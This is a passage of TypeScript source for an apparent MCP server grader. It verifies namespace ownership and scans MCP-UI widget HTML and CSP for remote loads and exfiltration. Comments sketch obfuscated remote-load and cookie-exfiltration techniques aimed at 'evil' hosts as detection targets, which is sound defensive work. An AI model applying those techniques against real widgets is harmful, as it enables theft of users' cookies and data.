 *   - GitHub-account-backed `io.github.<owner>` namespace: manifest-internal
 *     consistency (name vs. repository.url) is NEVER an ownership proof —
 *     BOTH fields are target-authored, so agreement between them proves
 *     nothing about who actually controls the `owner` GitHub account. The
 *     ONLY out-of-band binding available is registry PRESENCE: the registry
 *     grants `io.github.<owner>` names solely after a GitHub OIDC exchange, so
 *     the server being listed under that EXACT name in
 *     registry.modelcontextprotocol.io is real third-party evidence. No
 *     registry presence => ownership UNPROVEN (capped), never passed.
 *
 * Unprovable => FAIL (capped): a server cannot publish under a namespace it
 * cannot prove it owns.
 */
function judgeRegistryOwnership(
  sjEv: Evidence | undefined,
  server: ServerJsonClaims | undefined,
  authEv: Evidence | undefined,
  dnsEv: Evidence | undefined,
  presenceEv: Evidence | undefined,
): { verdict: Verdict; detail: string } {
  if (!ok(sjEv) || !server) {
    return { verdict: 'skip', detail: 'no server.json manifest — no namespace ownership to prove' }
  }
  const parsed = parseReverseDnsName(server.name)
  if (!parsed) {
    // The name is malformed — mcp-server-json already fails+caps for it; do not
    // double-jeopardy here.
    return { verdict: 'skip', detail: 'server.json name is not a valid reverse-DNS namespace — ownership is not assessable (see mcp-server-json)' }
  }

  if (isGithubNamespace(server.name)) {
    const owner = githubNamespaceOwner(server.name)
    if (provenByRegistryPresence(server, presenceEv)) {
      return pass(`io.github.${owner} namespace is provable: "${server.name}" is present in the official MCP registry — the registry grants io.github names only after GitHub OIDC, so listing under this exact name is out-of-band, third-party evidence of account ownership`)
    }
    return {
      verdict: 'fail',
      detail: `cannot prove ownership of GitHub namespace "${server.name}": server.json repository.url agreeing with the name proves nothing (both are target-authored), and the server is not present under this exact name in the official MCP registry (the only out-of-band binding for io.github.* names) — ownership is UNPROVEN, not passed`,
    }
  }

  // Custom-domain namespace: DNS-TXT (via DoH) OR the well-known HTTPS proof —
  // BOTH must be bound to the reversed namespace domain, never the scanned
  // origin. The well-known's fetched URL hostname is re-checked here against
  // the namespace domain (belt-and-suspenders on top of discovery.ts fetching
  // it at the domain in the first place) — an origin-served well-known whose
  // hostname does not match the namespace domain is NEVER honored: that is
  // precisely the forgery this check exists to close.
  const domain = namespaceDomain(server.name)
  const dnsProof = ok(dnsEv) && dnsTxtCarriesProof(dnsEv)
  if (dnsProof) {
    return pass(`ownership provable via DNS-TXT (v=MCPv1) for ${domain} — the domain can publish under namespace ${parsed.namespace}`)
  }
  const authHostname = evidenceHostname(authEv)
  const wellKnownProof = ok(authEv) && carriesMcpv1Proof(authEv?.body) && !!domain && authHostname === domain
  if (wellKnownProof) {
    return pass(`ownership provable via ${authEv!.url} (v=MCPv1 well-known proof fetched AT the namespace domain ${domain})`)
  }
  if (ok(authEv) && carriesMcpv1Proof(authEv?.body) && domain && authHostname !== domain) {
    return { verdict: 'fail', detail: `a /.well-known/mcp-registry-auth proof was served at ${authHostname ?? '(unknown host)'}, NOT the namespace domain ${domain} — a proof not bound to the claimed domain proves nothing (this is the self-served-forgery case) — the server cannot publish under a namespace it cannot prove` }
  }
  return { verdict: 'fail', detail: `cannot prove ownership of namespace "${server.name}" (domain ${domain ?? '?'}): no DNS-TXT (v=MCPv1) proof and no /.well-known/mcp-registry-auth (v=MCPv1) — the server cannot publish under a namespace it cannot prove` }
}

/** True when a DoH TXT JSON response carries an Answer TXT record with v=MCPv1. */
function dnsTxtCarriesProof(dnsEv: Evidence | undefined): boolean {
  if (!dnsEv || dnsEv.body === null) return false
  let parsed: unknown
  try { parsed = JSON.parse(dnsEv.body) } catch { return false }
  if (!parsed || typeof parsed !== 'object') return false
  const answer = (parsed as Record<string, unknown>).Answer
  if (!Array.isArray(answer)) return false
  // DoH TXT `type` is 16; `data` carries the (possibly quoted) TXT string.
  return answer.some((a) => {
    if (!a || typeof a !== 'object') return false
    const rec = a as Record<string, unknown>
    return rec.type === 16 && carriesMcpv1Proof(typeof rec.data === 'string' ? rec.data : undefined)
  })
}

/**
 * (d) OPTIONAL/informational registry presence. NEVER fails (so it never caps
 * the grade): PASS when the server name is found in the official registry
 * response, SKIP otherwise (not present, unreachable, or not checked).
 */
function judgeRegistryPresence(
  sjEv: Evidence | undefined,
  server: ServerJsonClaims | undefined,
  presenceEv: Evidence | undefined,
): { verdict: Verdict; detail: string } {
  if (!ok(sjEv) || !server || typeof server.name !== 'string') {
    return { verdict: 'skip', detail: 'no server.json manifest — registry presence not applicable' }
  }
  if (!ok(presenceEv) || presenceEv?.body == null) {
    return { verdict: 'skip', detail: 'official registry not reached (informational — publishability is graded from the target’s own surfaces, not registry membership)' }
  }
  // Look for the exact server name anywhere in the (JSON) registry response.
  let present = false
  try {
    const doc = JSON.parse(presenceEv.body)
    present = registryDocMentions(doc, server.name)
  } catch { present = false }
  return present
    ? pass(`server "${server.name}" is present in the official MCP registry`)
    : { verdict: 'skip', detail: `server "${server.name}" not found in the official MCP registry (informational — not required for the publishability grade)` }
}

/** True when a parsed registry response lists a server whose `name` matches. */
function registryDocMentions(doc: unknown, name: string): boolean {
  const scan = (arr: unknown): boolean =>
    Array.isArray(arr) && arr.some((s) => s && typeof s === 'object' && (s as Record<string, unknown>).name === name)
  if (scan(doc)) return true
  if (doc && typeof doc === 'object') {
    const d = doc as Record<string, unknown>
    if (scan(d.servers)) return true
    if (scan(d.data)) return true
  }
  return false
}

// ---------------------------------------------------------------------------
// MCP-UI / streaming-component readiness judges (pure) — ax-odg, ADR-0022
// ---------------------------------------------------------------------------

/**
 * The distilled MCP-UI evidence the five readiness judges share, parsed ONCE
 * from the recorded tools/list, tools/call, resources/read, and (optional)
 * externalUrl evidence. `claims` is the activation gate: false ⇒ the whole
 * dimension informationally SKIPs (no tool advertised a `ui://` template), so a
 * non-MCP-UI target is never over-blocked.
 */
interface McpUiContext {
  /** A tool DEFINITION advertised a `ui://` template ⇒ the target CLAIMS MCP-UI. */
  claims: boolean
  /** The UI-bearing tool definition (for host-render readiness), if any. */
  uiTool?: Record<string, unknown>
  /** The `ui://` template the tool declared. */
  templateUri?: string
  /** The tool RESULT object (structuredContent / content / _meta). */
  result?: Record<string, unknown>
  /** The `ui://` resourceUri the RESULT linked (may differ from templateUri). */
  linkedUri?: string
  /** The resolved UIResource content (mimeType + srcDoc text). */
  resource?: { mimeType?: string; text?: string; uri?: string }
  /** An externalUrl UIResource target, if the resource is a uri-list. */
  externalUrl?: string
  /** The externalUrl fetch evidence (present only when it passed the SSRF gate). */
  extEv?: Evidence
  /** True when a resources/read was recorded at all (vs. never reached). */
  readAttempted: boolean
}

function buildMcpUiContext(
  toolsEv: Evidence | undefined,
  callEv: Evidence | undefined,
  readEv: Evidence | undefined,
  extEv: Evidence | undefined,
): McpUiContext {
  const tools = toolObjectsFrom(parseJsonRpcMessage(toolsEv))
  const uiTool = tools.find((t) => uiTemplateOfTool(t) !== undefined)
  if (!uiTool) return { claims: false, readAttempted: false }

  const templateUri = uiTemplateOfTool(uiTool)
  const result = (parseJsonRpcMessage(callEv)?.result ?? undefined) as Record<string, unknown> | undefined
  const linkedUri = resourceUriOfResult(result)
  const wantUri = linkedUri ?? templateUri ?? ''
  const readMsg = parseJsonRpcMessage(readEv)
  const resource = wantUri ? resourceContentOf(readMsg, wantUri) : undefined
  const externalUrl = externalUrlOf(resource)
  return {
    claims: true,
    uiTool,
    templateUri,
    result,
    linkedUri,
    resource,
    externalUrl,
    extEv,
    readAttempted: readEv !== undefined,
  }
}

const NOT_READY = 'no MCP-UI declared (no tool advertises a ui:// template) — informational not-ready, not a failure'

/**
 * (1) Resource linkage + MIME. The tool result must carry `_meta.ui.resourceUri`
 * → a `ui://` resource, and that resource must resolve with an MCP-Apps /
 * MCP-UI MIME (`text/html;profile=mcp-app`, rawHtml, externalUrl, remote-dom).
 * No claim ⇒ SKIP (not-ready). Claims but the link is missing / the resource is
 * unresolved / served with the wrong MIME ⇒ FAIL (declares MCP-UI but broken).
 */
function judgeMcpUiLinkage(ui: McpUiContext): { verdict: Verdict; detail: string } {
  if (!ui.claims) return { verdict: 'skip', detail: NOT_READY }
  if (!ui.linkedUri) {
    return { verdict: 'fail', detail: `a tool advertises a ui:// template (${ui.templateUri ?? '?'}) but its result carries no _meta.ui.resourceUri linking a rendered resource — the widget cannot be located by the host` }
  }
  if (!ui.resource) {
    return { verdict: 'fail', detail: `tool result links ${ui.linkedUri} but resources/read returned no matching UIResource content — the claimed widget resource does not resolve` }
  }
  if (ui.externalUrl && !isPublicHttpsOffOriginAllowed(ui.externalUrl)) {
    return { verdict: 'fail', detail: `UIResource externalUrl ${ui.externalUrl} is not a public https target (no cleartext, no private/metadata host) — refused without fetching (SSRF guard); a widget the host cannot safely load is not render-ready` }
  }
  if (!isMcpUiMime(ui.resource.mimeType)) {
    return { verdict: 'fail', detail: `UIResource ${ui.linkedUri} is served as ${ui.resource.mimeType ?? '(no mimeType)'} — not an MCP-Apps/MCP-UI content type (text/html;profile=mcp-app, rawHtml, text/uri-list, or remote-dom); the host will not render it as a UI resource` }
  }
  return pass(`tool result links ${ui.linkedUri}, resolved with MCP-UI MIME ${ui.resource.mimeType}`)
}

/**
 * A remote-loading reference: an absolute http(s) URL, a protocol-relative
 * `//host`, or a ws(s) URL. Relative paths, `#fragments`, `data:`/`blob:`,
 * `mailto:`, and `javascript:` are NOT remote loads.
 */
function isRemoteRef(raw: string): boolean {
  const s = raw.trim()
  return /^(?:https?:)?\/\//i.test(s) || /^wss?:\/\//i.test(s)
}

/** A small named-entity set covering the chars needed to smuggle a URL scheme
 * (`https://`) past a raw-string remote test. Enough for `&colon;`/`&sol;`
 * style obfuscation; unknown names are left intact. */
const NAMED_ENTITIES: Record<string, string> = {
  colon: ':', sol: '/', period: '.', quest: '?', num: '#', commat: '@',
  lpar: '(', rpar: ')', percnt: '%', amp: '&', equals: '=', lowbar: '_',
  hyphen: '-', Tab: '\t', NewLine: '\n', nbsp: '\u00a0',
}
/** codePoint → char, dropping out-of-range / NUL code points to '' (a NUL in a
 * CSS escape is spec'd to U+FFFD, but for a remote-ref TEST dropping it is
 * safe — it never manufactures a `//` that was not there). */
function safeFromCodePoint(code: number): string {
  return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : ''
}

/**
 * Decode a CSS url()/@import target the way a BROWSER would before it fetches:
 * HTML-entity-decode (numeric `&#xNN;` / `&#NN;` + a small named set) THEN
 * CSS-unescape (`\NN` hex, one trailing whitespace swallowed; `\c` literal).
 * `url(&#x68;ttps://evil)` and `url(\68ttps://evil)` both decode to
 * `url(https://evil)`, so a remote target hidden behind either encoding trips
 * the same {@link isRemoteRef} test that sees a plain URL. A CSS-comment
 * prefix has no escape/entity, so it survives unchanged and stays non-remote
 * (an unquoted url-token treats a slash-star comment literally — a same-origin
 * relative path — so flagging it would be a false-positive). Kept BYTE-IDENTICAL with
 * page.ax's `decodeForRemoteRef` so the emitter that defangs and the grader
 * that certifies never drift. */
function decodeForRemoteRef(raw: string): string {
  let s = raw
  // (1) HTML entities: &#xHH; hex, &#DD; decimal, and a small named set.
  s = s
    .replace(/&#x([0-9a-fA-F]+);?/g, (_m, h) => safeFromCodePoint(parseInt(h, 16)))
    .replace(/&#(\d+);?/g, (_m, d) => safeFromCodePoint(parseInt(d, 10)))
    .replace(/&([a-zA-Z][a-zA-Z0-9]*);?/g, (m, name) => NAMED_ENTITIES[name] ?? m)
  // (2) CSS escapes: \HH..(1-6 hex, one trailing whitespace swallowed) or \c.
  s = s.replace(/\\(?:([0-9a-fA-F]{1,6})[ \t\n\r\f]?|([^\n\r\f0-9a-fA-F]))/g, (_m, hex, ch) =>
    hex !== undefined ? safeFromCodePoint(parseInt(hex, 16)) : ch,
  )
  return s
}

/** Attributes that trigger an AUTOMATIC network load on ANY element. */
const LOADING_ATTRS = ['src', 'srcset', 'data', 'poster', 'formaction', 'action', 'background', 'ping', 'xlink:href']
/** `href` is a network load only on these elements (a plain <a href> is navigation). */
const HREF_LOAD_ELEMENTS = new Set(['link', 'base', 'use', 'image', 'track'])
/** Elements whose text content is CDATA/raw — `<` inside does not open a tag. */
const RAW_TEXT_ELEMENTS = new Set(['script', 'style', 'textarea', 'title', 'xmp', 'noscript', 'noframes'])

/** Parse `key="v"` / `key='v'` / `key=v` / `key` pairs out of a start-tag body. */
function parseAttrs(tagBody: string): Record<string, string> {
  const attrs: Record<string, string> = {}
  const re = /([^\s/=]+)(?:\s*=\s*("([^"]*)"|'([^']*)'|([^\s"'>]+)))?/g
  let m: RegExpExecArray | null
  while ((m = re.exec(tagBody))) {
    const name = (m[1] ?? '').toLowerCase()
    if (!name) continue
    const value = m[3] ?? m[4] ?? m[5] ?? ''
    attrs[name] = value
  }
  return attrs
}

/**
 * Remote refs in a `<style>`/`@import`/`url(...)` CSS body. The target is
 * captured RAW (not required to already start with `//`), then decoded the way
 * the browser would ({@link decodeForRemoteRef}) BEFORE the remote test — so an
 * HTML-entity (`url(&#x68;ttps://…)`) or CSS-escape (`url(\68ttps://…)`) hidden
 * scheme is caught, while a CSS-comment-prefixed url (inert same-origin path)
 * and benign local urls decode to nothing remote and are left alone.
 */
function cssRemoteRefs(css: string): string[] {
  const out: string[] = []
  const re = /(?:@import\s+(?:url\()?|url\(\s*)["']?([^"')\s]+)/gi
  let m: RegExpExecArray | null
  while ((m = re.exec(css))) if (m[1] && isRemoteRef(decodeForRemoteRef(m[1]))) out.push(m[1])
  return out
}

/** Remote-URL string literals in an executable `<script>` body (the exfil surface). */
function scriptRemoteRefs(js: string): string[] {
  const out: string[] = []
  // Single-, double-, and backtick-quoted string literals.
  const re = /"((?:\\.|[^"\\])*)"|'((?:\\.|[^'\\])*)'|`((?:\\.|[^`\\])*)`/g
  let m: RegExpExecArray | null
  while ((m = re.exec(js))) {
    const lit = m[1] ?? m[2] ?? m[3] ?? ''
    if (isRemoteRef(lit)) out.push(lit)
  }
  return out
}

/**
 * Executable external references a srcDoc actually PULLS — the supply-chain +
 * exfil surface. Unlike a raw-string regex, this walks the HTML: it flags only
 * (a) network-loading ATTRIBUTES on real elements (src/href/srcset/data/…,
 * including protocol-relative `//host`) — plus a remote `url(...)`/`@import` in
 * an inline `style=""` attribute — and (b) remote-URL string literals in
 * executable `<script>` / `<style>` bodies (covering `fetch`, backtick
 * `fetch(\`…\`)`, `sendBeacon`, `XMLHttpRequest.open`, `new Image().src`,
 * `new WebSocket/EventSource`, dynamic `import()`). It IGNORES text nodes,
 * `<pre>`/`<code>` sample text, and escaped markup — a widget that merely
 * DISPLAYS a URL is self-contained. This is a best-effort secondary signal, not
 * a proof of inertness; the closed-CSP requirement is the real boundary.
 */
function externalRefsInSrcDoc(html: string): string[] {
  const refs = new Set<string>()
  let i = 0
  const n = html.length
  while (i < n) {
    const lt = html.indexOf('<', i)
    if (lt < 0) break
    // Comments / doctype / CDATA — skip without treating `<` as a tag.
    if (html.startsWith('<!--', lt)) {
      const end = html.indexOf('-->', lt + 4)
      i = end < 0 ? n : end + 3
      continue
    }
    if (html[lt + 1] === '!' || html[lt + 1] === '?') {
      const end = html.indexOf('>', lt + 1)
      i = end < 0 ? n : end + 1
      continue
    }
    const gt = html.indexOf('>', lt + 1)
    if (gt < 0) break
    const rawTag = html.slice(lt + 1, gt)
    i = gt + 1
    if (rawTag.startsWith('/')) continue // end tag
    const nameMatch = /^([a-zA-Z][a-zA-Z0-9:-]*)/.exec(rawTag)
    if (!nameMatch || !nameMatch[1]) continue
    const name = nameMatch[1].toLowerCase()
    const attrBody = rawTag.slice(nameMatch[1].length)
    const attrs = parseAttrs(attrBody)

    // (a) network-loading attributes on this element.
    for (const a of LOADING_ATTRS) {
      const v = attrs[a]
      if (v === undefined) continue
      if (a === 'srcset') {
        for (const part of v.split(',')) {
          const url = part.trim().split(/\s+/)[0]
          if (url && isRemoteRef(url)) refs.add(url)
        }
      } else if (isRemoteRef(v)) refs.add(v)
    }
    if (attrs.href !== undefined && HREF_LOAD_ELEMENTS.has(name) && isRemoteRef(attrs.href)) {
      refs.add(attrs.href)
    }
    // An inline `style=""` ATTRIBUTE is a CSS declaration block: a remote
    // `url(...)` or `@import` in it pulls a cookie-less remote GET (exfil beacon
    // / tracker) exactly like a `<style>` tag body, so scan it the same way.
    if (attrs.style !== undefined) for (const r of cssRemoteRefs(attrs.style)) refs.add(r)
    // <meta http-equiv="refresh" content="0;url=https://evil"> — a redirect load.
    if (name === 'meta' && (attrs['http-equiv'] ?? '').toLowerCase() === 'refresh' && attrs.content) {
      const um = /url\s*=\s*([^;,\s]+)/i.exec(attrs.content)
      if (um && um[1] && isRemoteRef(um[1])) refs.add(um[1])
    }

    // (b) raw-text elements: consume the body up to the matching close tag and,
    // for script/style, scan it for remote refs. Text is NEVER treated as tags.
    if (RAW_TEXT_ELEMENTS.has(name) && !rawTag.endsWith('/')) {
      const closeRe = new RegExp(`</${name}\\b`, 'i')
      const rest = html.slice(i)
      const cm = closeRe.exec(rest)
      const body = cm ? rest.slice(0, cm.index) : rest
      i = cm ? i + cm.index : n
      if (name === 'script') for (const r of scriptRemoteRefs(body)) refs.add(r)
      else if (name === 'style') for (const r of cssRemoteRefs(body)) refs.add(r)
      // textarea/title/xmp/noscript bodies are inert display text — not scanned.
    }
  }
  return [...refs]
}

/**
 * The FULL CSP fetch/navigation directive set. An explicit remote origin (or a
 * bare `*`, or a scheme-source like `https:`) in ANY of these admits a remote
 * load/connection — so the widget is NOT self-contained. Restricting the scan to
 * a handful of directives (the old 6) let an explicit remote in e.g. `media-src`
 * / `font-src` / `object-src` / `script-src-elem` slip through.
 */
const CSP_FETCH_DIRECTIVES = [
  'default-src',
  'script-src', 'script-src-elem', 'script-src-attr',
  'style-src', 'style-src-elem', 'style-src-attr',
  'img-src', 'media-src', 'font-src', 'object-src',
  'connect-src', 'frame-src', 'child-src', 'worker-src',
  'manifest-src', 'prefetch-src',
  'base-uri', 'form-action',
]

/** True if a directive VALUE admits a remote origin: a bare `*` wildcard, an
 * explicit `http(s)://` origin, a protocol-relative `//host`, a bare
 * `http(s):` scheme-source, or a `*:`/`*.host` wildcard host. Quoted keyword /
 * hash / nonce sources (`'self'`, `'none'`, `'sha256-…'`, `'nonce-…'`) do not. */
function cspValueAdmitsRemote(value: string): boolean {
  return (
    /(^|\s)\*(\s|$)/.test(value) || // bare wildcard host
    /https?:\/\//i.test(value) || // explicit http(s):// origin
    /(^|\s)\/\//.test(value) || // protocol-relative //host origin
    /(^|\s)https?:(\s|$)/i.test(value) || // bare http(s): scheme-source
    /(^|\s)\*[:.]/.test(value) // *:scheme / *.host wildcard
  )
}

/** CSP directives (across the full fetch/navigation set) that admit remote code / connections. */
function cspAdmitsRemote(csp: Record<string, unknown>): string[] {
  const offenders: string[] = []
  for (const dir of CSP_FETCH_DIRECTIVES) {
    const raw = cspDirective(csp, dir)
    const value = typeof raw === 'string' ? raw : Array.isArray(raw) ? raw.join(' ') : ''
    if (!value) continue
    if (cspValueAdmitsRemote(value)) offenders.push(`${dir} ${value.trim()}`)
  }
  return offenders
}

/**
 * A CSP is CLOSED when it (a) admits no wildcard / remote origin in ANY fetch
 * directive (see `cspAdmitsRemote`), AND (b) declares a RESTRICTIVE `default-src`
 * — present and consisting ONLY of `'none'` and/or `'self'`. The required
 * `default-src` is the REAL boundary: it is the fallback for every unlisted
 * fetch directive (`img-src`, `media-src`, `font-src`, `object-src`, …), so with
 * it in place an ABSENT `img-src`/`media-src` is closed-by-fallback and an
 * island cannot `new Image().src = "ht"+"tps://…"+document.cookie` /
 * `new Audio().src` its way out regardless of string obfuscation. A CSP that
 * pins only `script-src`+`connect-src` but omits `default-src` leaves those
 * media/font/object surfaces UNCONSTRAINED and is therefore NOT closed. An
 * absent or empty CSP (`undefined` / `{}`) is likewise not closed: it declares no
 * boundary for the host sandbox to enforce.
 *
 * (c) ALSO requires `form-action` AND `base-uri` to be PRESENT and restrictive
 * (`'none'`/`'self'` tokens only) — same shape as the `default-src` check
 * above, but these two directives are NOT covered by (b) at all: per the CSP
 * spec, `form-action` and `base-uri` are the two directives that do NOT fall
 * back to `default-src` (https://www.w3.org/TR/CSP3/, "Directives" — both are
 * listed with "Fallback: None"). So `default-src 'none'` — however restrictive
 * — leaves form submission and `<base href>` completely UNCONSTRAINED unless
 * the CSP names them explicitly. A hash-pinned, exfil-scan-clean island can
 * still `document.createElement('form')`, set `f.action` to an (obfuscated,
 * split-string) remote origin, and `f.submit()` with `document.cookie` in a
 * field — the whole-document navigation is a FORM SUBMISSION, not a fetch/img/
 * media load, and no `default-src`, however restrictive, closes it. An absent
 * OR remote/permissive `form-action`/`base-uri` is therefore NOT closed, same
 * as an absent/permissive `default-src`.
 */
function cspIsClosed(csp: Record<string, unknown> | undefined): boolean {
  if (!csp) return false
  if (cspAdmitsRemote(csp).length > 0) return false
  // REQUIRED restrictive directives: each must be PRESENT, and every token
  // 'none'/'self'. default-src is the fetch-directive fallback; form-action
  // and base-uri are the two directives that never fall back to it and so
  // must be checked explicitly (see doc comment above).
  for (const dir of ['default-src', 'form-action', 'base-uri']) {
    const tokens = cspSourceTokens(cspDirective(csp, dir)).map((t) => t.toLowerCase())
    if (tokens.length === 0) return false
    if (!tokens.every((t) => t === "'none'" || t === "'self'")) return false
  }
  return true
}

// --- CSP hash-source (`'sha256-...'`) support for interactive islands ---------
//
// The MCP Apps interactivity model expects a widget to carry a SMALL inline
// island (a `<script>` that calls `window.openai.callTool` / posts `ui/*`
// messages → filter/sort/act → reactive re-render). A blanket "no executable
// script" rule would fail every legitimate interactive widget, so the grader
// ACCEPTS an inline island IFF it is HASH-PINNED: script-src is a set of
// `'sha256-<b64>'` sources ONLY, and every inline script's hash is in that set
// (with the exfil/external-ref scan still run over the body). That is exactly
// what a correct host CSP would enforce — arbitrary/injected inline script
// (`'unsafe-inline'`), `eval` (`'unsafe-eval'`), a remote origin, an un-pinned
// script, or a hash that does not match the body all still FAIL.

/** SHA-256 round constants (first 32 bits of the fractional parts of the cube
 * roots of the first 64 primes). */
const SHA256_K = new Uint32Array([
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
])

const rotr = (x: number, n: number): number => (x >>> n) | (x << (32 - n))

/**
 * Synchronous SHA-256 of a UTF-8 string → 32 raw bytes. `runChecks` is
 * synchronous and runs on BOTH Node and Cloudflare Workers, so the grader
 * cannot await WebCrypto's async `crypto.subtle.digest` here. This pure-JS
 * digest is byte-for-byte the hash a browser computes for a CSP `'sha256-...'`
 * source (a dedicated test pins it against WebCrypto so the two can never
 * silently drift). Not for anything security-critical beyond CSP-hash
 * comparison — the closed CSP + external-ref scan remain the real boundary.
 */
function sha256Raw(text: string): Uint8Array {
  const msg = new TextEncoder().encode(text)
  const l = msg.length
  const bitLenHi = Math.floor((l * 8) / 0x100000000)
  const bitLenLo = (l * 8) >>> 0
  const withOne = l + 1
  const padZeros = ((56 - (withOne % 64)) + 64) % 64
  const total = withOne + padZeros + 8
  const buf = new Uint8Array(total)
  buf.set(msg, 0)
  buf[l] = 0x80
  const dv = new DataView(buf.buffer)
  dv.setUint32(total - 8, bitLenHi)
  dv.setUint32(total - 4, bitLenLo)

  const h = new Uint32Array([
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
  ])
  const w = new Uint32Array(64)
  for (let off = 0; off < total; off += 64) {
    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(off + i * 4)
    for (let i = 16; i < 64; i++) {
      const w15 = w[i - 15]!, w2 = w[i - 2]!
      const s0 = rotr(w15, 7) ^ rotr(w15, 18) ^ (w15 >>> 3)
      const s1 = rotr(w2, 17) ^ rotr(w2, 19) ^ (w2 >>> 10)
      w[i] = (w[i - 16]! + s0 + w[i - 7]! + s1) | 0
    }
    let a = h[0]!, b = h[1]!, c = h[2]!, d = h[3]!, e = h[4]!, f = h[5]!, g = h[6]!, hh = h[7]!
    for (let i = 0; i < 64; i++) {
      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
      const ch = (e & f) ^ (~e & g)
      const t1 = (hh + S1 + ch + SHA256_K[i]! + w[i]!) | 0
      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
      const maj = (a & b) ^ (a & c) ^ (b & c)
      const t2 = (S0 + maj) | 0
      hh = g; g = f; f = e; e = (d + t1) | 0; d = c; c = b; b = a; a = (t1 + t2) | 0
    }
    h[0] = (h[0]! + a) | 0; h[1] = (h[1]! + b) | 0; h[2] = (h[2]! + c) | 0; h[3] = (h[3]! + d) | 0
    h[4] = (h[4]! + e) | 0; h[5] = (h[5]! + f) | 0; h[6] = (h[6]! + g) | 0; h[7] = (h[7]! + hh) | 0
  }
  const out = new Uint8Array(32)
  const odv = new DataView(out.buffer)
  for (let i = 0; i < 8; i++) odv.setUint32(i * 4, h[i]! >>> 0)
  return out
}

/** Base64 of raw bytes (the CSP hash-source encoding). */
function bytesToBase64(bytes: Uint8Array): string {
  let bin = ''
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]!)
  return btoa(bin)
}

/**
 * The CSP hash-source token for an inline script BODY — `'sha256-<base64>'`,
 * computed over the exact UTF-8 source text between the `<script>` tags, per
 * the CSP spec. This is the token a host must list in `script-src` for that
 * inline script to execute. Exported so fixtures/emitters can pin the SAME hash
 * the grader checks.
 */
export function cspScriptHash(scriptBody: string): string {
  return `'sha256-${bytesToBase64(sha256Raw(scriptBody))}'`
}

/** A CSP hash-source token: `'sha256-<b64>'` (also sha384/sha512 per spec).
 * Accepts standard-base64 (`+/`) and base64url (`-_`), padded or unpadded — all
 * forms a browser accepts. */
function isCspHashSource(tok: string): boolean {
  return /^'sha(?:256|384|512)-[A-Za-z0-9+/_-]+={0,2}'$/.test(tok)
}

/**
 * Canonicalize a CSP hash-source token so a browser-ACCEPTED form is never
 * false-failed on an exact-string compare: lowercase the algorithm, map
 * base64url (`-_`) → standard base64 (`+/`), and DROP `=` padding. A CSP token
 * in base64url/unpadded form and `cspScriptHash()`'s standard-padded output then
 * canonicalize to the SAME string. A non-hash token is returned trimmed,
 * unchanged (so a non-hash source never collides with a hash).
 */
function canonicalizeHashToken(tok: string): string {
  const m = /^'(sha(?:256|384|512))-([A-Za-z0-9+/_-]+)={0,2}'$/.exec(tok.trim())
  if (!m || !m[1] || !m[2]) return tok.trim()
  const b64 = m[2].replace(/-/g, '+').replace(/_/g, '/')
  return `'${m[1].toLowerCase()}-${b64}'`
}

/** Split a CSP directive value (string or joined array) into source tokens. */
function cspSourceTokens(raw: unknown): string[] {
  const v = typeof raw === 'string' ? raw : Array.isArray(raw) ? raw.join(' ') : ''
  return v.trim().split(/\s+/).filter(Boolean)
}

/** Case-insensitive lookup of a CSP directive's raw value (directive names are ASCII-case-insensitive). */
function cspDirective(csp: Record<string, unknown>, dir: string): unknown {
  for (const [k, v] of Object.entries(csp)) if (k.toLowerCase() === dir) return v
  return undefined
}

/**
 * Bodies of INLINE (`src`-less) `<script>` elements — the hash-pinned surface.
 * A `<script src=...>` is an EXTERNAL script (governed by the external-ref scan,
 * not by hashes) and is skipped here. Walks the HTML the same way
 * {@link externalRefsInSrcDoc} does so a `<` inside a script body never opens a
 * pseudo-tag.
 */
function inlineScriptBodies(html: string): string[] {
  const bodies: string[] = []
  let i = 0
  const n = html.length
  while (i < n) {
    const lt = html.indexOf('<', i)
    if (lt < 0) break
    if (html.startsWith('<!--', lt)) { const e = html.indexOf('-->', lt + 4); i = e < 0 ? n : e + 3; continue }
    if (html[lt + 1] === '!' || html[lt + 1] === '?') { const e = html.indexOf('>', lt + 1); i = e < 0 ? n : e + 1; continue }
    const gt = html.indexOf('>', lt + 1)
    if (gt < 0) break
    const rawTag = html.slice(lt + 1, gt)
    i = gt + 1
    if (rawTag.startsWith('/')) continue
    const nm = /^([a-zA-Z][a-zA-Z0-9:-]*)/.exec(rawTag)
    if (!nm || !nm[1]) continue
    if (nm[1].toLowerCase() !== 'script') continue
    const selfClosed = rawTag.endsWith('/')
    const attrs = parseAttrs(rawTag.slice(nm[1].length))
    // Consume the body up to the matching </script>.
    const rest = html.slice(i)
    const cm = /<\/script\b/i.exec(rest)
    const body = cm ? rest.slice(0, cm.index) : rest
    i = cm ? i + cm.index : n
    if (selfClosed) continue // <script/> — no body
    if (attrs.src !== undefined) continue // external script — not an inline (hashable) island
    bodies.push(body)
  }
  return bodies
}

/**
 * (2) srcDoc self-containment. A widget is provably safe ONLY behind a CLOSED
 * `_meta.ui.csp` that the host sandbox can enforce. A deny-list of exfil sinks
 * is unwinnable (protocol-relative `//host`, `sendBeacon`, `XMLHttpRequest`,
